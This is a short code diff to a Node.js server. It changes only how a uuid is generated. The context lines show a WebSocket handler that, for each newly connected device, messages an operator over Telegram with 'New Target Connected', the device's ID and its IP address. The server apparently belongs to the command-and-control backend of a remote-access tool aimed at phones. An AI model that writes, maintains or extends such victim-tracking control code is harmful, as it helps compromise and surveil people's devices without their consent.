@@ -5,7 +5,7 @@ const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
 const multer = require('multer');
 const bodyParser = require('body-parser');
-const uuid4 = require('uuid');
+const { v4: uuid } = require('uuid');
 const axios = require('axios');
 
 const upload = multer();
@@ -52,7 +52,7 @@ server.listen(PORT, () => {
 
 // WebSocket connection handler
 wss.on('connection', (ws, req) => {
-  ws.uuid = uuid4.v4();
+  ws.uuid = uuid();
   bot.sendMessage(chatId, 
     `<b>New Target Connected 📱\n\nID = <code>${ws.uuid}</code>\nIP = ${req.socket.remoteAddress.toString().replaceAll('f','').replaceAll(':','')}</b> 🌐`, 
     {'parse_mode': 'HTML'});
